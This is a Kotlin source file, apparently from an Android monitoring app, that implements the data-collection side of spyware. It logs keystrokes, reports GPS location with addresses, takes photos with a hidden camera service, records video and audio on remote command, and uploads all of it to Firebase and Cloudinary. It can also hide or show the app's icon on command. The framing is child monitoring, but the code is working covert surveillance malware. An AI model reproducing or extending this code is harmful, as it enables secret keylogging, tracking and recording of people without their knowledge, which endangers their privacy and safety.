package com.safe.setting.app.services.accessibilityData

import android.content.Context
import android.location.Geocoder
import android.location.Location
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.safe.setting.app.R
import com.safe.setting.app.data.model.*
import com.safe.setting.app.data.preference.DataSharePreference.audioRecordingCount
import com.safe.setting.app.data.preference.DataSharePreference.lastAudioResetTimestamp
import com.safe.setting.app.data.preference.DataSharePreference.lastVideoResetTimestamp
import com.safe.setting.app.data.preference.DataSharePreference.videoRecordingCount
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.utils.AudioRecorderUtil
import com.safe.setting.app.utils.CloudinaryManager
import com.safe.setting.app.utils.ConstFun.showApp
import com.safe.setting.app.utils.Consts.CHILD_CAPTURE_PHOTO
import com.safe.setting.app.utils.Consts.CHILD_GPS
import com.safe.setting.app.utils.Consts.CHILD_PERMISSION
import com.safe.setting.app.utils.Consts.CHILD_RECORD_VIDEO
import com.safe.setting.app.utils.Consts.CHILD_RECORD_VOICE
import com.safe.setting.app.utils.Consts.CHILD_SERVICE_DATA
import com.safe.setting.app.utils.Consts.CHILD_SHOW_APP
import com.safe.setting.app.utils.Consts.DATA
import com.safe.setting.app.utils.Consts.KEY_LOGGER
import com.safe.setting.app.utils.Consts.KEY_TEXT
import com.safe.setting.app.utils.Consts.LOCATION
import com.safe.setting.app.utils.Consts.PARAMS
import com.safe.setting.app.utils.Consts.PHOTO
import com.safe.setting.app.utils.Consts.TAG
import com.safe.setting.app.utils.Consts.VIDEO
import com.safe.setting.app.utils.Consts.VOICE
import com.safe.setting.app.utils.MyCountDownTimer
import com.safe.setting.app.utils.VideoRecorderUtil
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraConfig
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.CompositeDisposable
import io.reactivex.rxjava3.schedulers.Schedulers
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*
import javax.inject.Inject


@Suppress("SameParameterValue")
class InteractorAccessibilityData @Inject constructor(
    private val context: Context,
    private val firebase: InterfaceFirebase
) : InterfaceAccessibility, CameraCallbacks {

    private var startTime = (1 * 60 * 1440000).toLong()
    private var interval = (1 * 1000).toLong()
    private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
    private var disposable: CompositeDisposable = CompositeDisposable()
    private var lastLocationUpdate: Long = 0
    private val locationUpdateInterval: Long = 60000 // 60 seconds

    private var countDownTimer : MyCountDownTimer = MyCountDownTimer(startTime,interval){
        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).removeValue()
        startCountDownTimer()
    }

    override fun startCountDownTimer() {
        countDownTimer.start()
    }

    override fun stopCountDownTimer() {
        countDownTimer.cancel()
    }


    override fun clearDisposable() {
        disposable.clear()
    }

    override fun setDataKey(data: String) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference(KEY_LOGGER).child(DATA).push().child(KEY_TEXT).setValue(data)
    }

    override fun setDataLocation(location: Location) {
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastLocationUpdate >= locationUpdateInterval) {
            lastLocationUpdate = currentTime
            if (firebase.getUser() != null) {
                var address: String
                val geoCoder = Geocoder(context, Locale.getDefault())
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    geoCoder.getFromLocation(location.latitude, location.longitude, 1,
                        (Geocoder.GeocodeListener { addresses ->
                            if (addresses.isNotEmpty()) {
                                address = addresses[0].getAddressLine(0)
                                val model = com.safe.setting.app.data.model.Location(location.latitude, location.longitude, address, getDateTime())
                                firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)
                            } else {
                                address = context.getString(R.string.address_not_found)
                            }
                        })
                    )
                } else {
                    address = try {
                        @Suppress("DEPRECATION")
                        geoCoder.getFromLocation(location.latitude, location.longitude, 1)?.get(0)!!.getAddressLine(0)
                    } catch (e: IOException) {
                        context.getString(R.string.address_not_found)
                    }
                    val model = com.safe.setting.app.data.model.Location(location.latitude, location.longitude, address, getDateTime())
                    firebase.getDatabaseReference("$LOCATION/$DATA").setValue(model)
                }
            }
        }
    }

    override fun enablePermissionLocation(location: Boolean) {
        if (firebase.getUser() != null) {
            firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_PERMISSION").setValue(location)
        }
    }

    override fun enableGps(gps: Boolean) {
        if (firebase.getUser() != null) {
            firebase.getDatabaseReference("$LOCATION/$PARAMS/$CHILD_GPS").setValue(gps)
        }
    }

    override fun setRunServiceData(run: Boolean) {
        if (firebase.getUser() != null) {
            firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA").setValue(run)
        }
    }

    override fun getShowOrHideApp() {
        disposable.add(firebase.valueEvent("$DATA/$CHILD_SHOW_APP")
            .map { data -> data.value as Boolean }
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ context.showApp(it) },
                { e(TAG, it.message.toString()) }))
    }

    override fun getCapturePicture() {
        disposable.add(firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ child -> startCameraPicture(child) },
                { error -> e(TAG, error.message.toString()) }))
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun getRecordVideoCommand() {
        disposable.add(firebase.valueEventModel("$VIDEO/$PARAMS", ChildVideo::class.java)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ command ->
                if (command.recordVideo == true) {
                    handleVideoRecording(command)
                }
            }, { error -> e(TAG, "Video command error: ${error.message}") })
        )
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun getRecordAudioCommand() {
        disposable.add(firebase.valueEventModel("$VOICE/$PARAMS", ChildAudio::class.java)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ command ->
                if (command.recordAudio == true) {
                    handleAudioRecording()
                }
            }, { error -> e(TAG, "Audio command error: ${error.message}") })
        )
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun handleVideoRecording(command: ChildVideo) {
        val currentTime = System.currentTimeMillis()
        if (currentTime - context.lastVideoResetTimestamp > 24 * 60 * 60 * 1000) {
            context.videoRecordingCount = 0
            context.lastVideoResetTimestamp = currentTime
        }

        if (context.videoRecordingCount < 5) {
            context.videoRecordingCount++
            val videoUtil = VideoRecorderUtil(context) { file ->
                if (file != null) {
                    uploadMediaFile(file, "video")
                } else {
                    firebase.getDatabaseReference("$VIDEO/$PARAMS/$CHILD_RECORD_VIDEO").setValue(false)
                }
            }
            videoUtil.startRecording(command.facing ?: 0)
        } else {
            Log.w(TAG, "Video recording limit reached for the day.")
            firebase.getDatabaseReference("$VIDEO/$PARAMS/$CHILD_RECORD_VIDEO").setValue(false)
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun handleAudioRecording() {
        val currentTime = System.currentTimeMillis()
        if (currentTime - context.lastAudioResetTimestamp > 24 * 60 * 60 * 1000) {
            context.audioRecordingCount = 0
            context.lastAudioResetTimestamp = currentTime
        }

        if (context.audioRecordingCount < 5) {
            context.audioRecordingCount++
            val audioUtil = AudioRecorderUtil(context) { file ->
                if (file != null) {
                    uploadMediaFile(file, "video") // Cloudinary uses 'video' for audio too
                } else {
                    firebase.getDatabaseReference("$VOICE/$PARAMS/$CHILD_RECORD_VOICE").setValue(false)
                }
            }
            audioUtil.startRecording()
        } else {
            Log.w(TAG, "Audio recording limit reached for the day.")
            firebase.getDatabaseReference("$VOICE/$PARAMS/$CHILD_RECORD_VOICE").setValue(false)
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun uploadMediaFile(file: File, resourceType: String) {
        disposable.add(CloudinaryManager.uploadMediaFile(file, resourceType)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ url ->
                val nameRandom = getRandomNumeric()
                val dateTime = getDateTime()
                if (file.extension == "mp4") {
                    val video = Video(nameRandom, dateTime, url)
                    firebase.getDatabaseReference("$VIDEO/$DATA").push().setValue(video)
                    firebase.getDatabaseReference("$VIDEO/$PARAMS/$CHILD_RECORD_VIDEO").setValue(false)
                } else { // audio
                    val audio = AudioRecord(nameRandom, dateTime, url)
                    firebase.getDatabaseReference("$VOICE/$DATA").push().setValue(audio)
                    firebase.getDatabaseReference("$VOICE/$PARAMS/$CHILD_RECORD_VOICE").setValue(false)
                }
                file.delete()
            }, { error ->
                e(TAG, "Upload failed: ${error.message}")
                file.delete()
                if (file.extension == "mp4") {
                    firebase.getDatabaseReference("$VIDEO/$PARAMS/$CHILD_RECORD_VIDEO").setValue(false)
                } else {
                    firebase.getDatabaseReference("$VOICE/$PARAMS/$CHILD_RECORD_VOICE").setValue(false)
                }
            })
        )
    }

    private fun startCameraPicture(childPhoto: ChildPhoto) {
        if (childPhoto.capturePhoto == true) {
            val cameraConfig = CameraConfig().builder(context)
                .setCameraFacing(childPhoto.facingPhoto!!)
                .setImageRotation(
                    if (childPhoto.facingPhoto == CameraFacing.FRONT_FACING_CAMERA) CameraRotation.ROTATION_270
                    else CameraRotation.ROTATION_90
                )
                .build()
            pictureCapture.startCamera(cameraConfig)
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onImageCapture(imageFile: File) {
        pictureCapture.stopCamera()

        disposable.add(CloudinaryManager.uploadPhoto(imageFile)
            .subscribeOn(Schedulers.io())
            .observeOn(AndroidSchedulers.mainThread())
            .subscribe({ url ->
                val photo = Photo(getRandomNumeric(), getDateTime(), url)
                firebase.getDatabaseReference("$PHOTO/$DATA").push().setValue(photo)
                firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)
                firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(true)
                imageFile.delete()
            }, {
                e(TAG, it.message.toString())
                imageFile.delete()
            })
        )
    }

    override fun onCameraError(errorCode: Int) {
        pictureCapture.stopCamera()
        firebase.getDatabaseReference("$PHOTO/$PARAMS/$CHILD_CAPTURE_PHOTO").setValue(false)

        if (errorCode == ERROR_CAMERA_PERMISSION_NOT_AVAILABLE ||
            errorCode == ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION ||
            errorCode == ERROR_IMAGE_WRITE_FAILED) {
            firebase.getDatabaseReference("$PHOTO/$CHILD_PERMISSION").setValue(false)
        }
    }


    private fun getDateTime(): String {
        return SimpleDateFormat("yyyy-MM-dd hh:mm:aa", Locale.getDefault()).format(Date())
    }

    private fun getRandomNumeric(): String {
        return (100000..999999).random().toString()
    }

    private fun e(@Suppress("SameParameterValue") tag: String, message: String) {
        Log.e(tag, message)
    }

}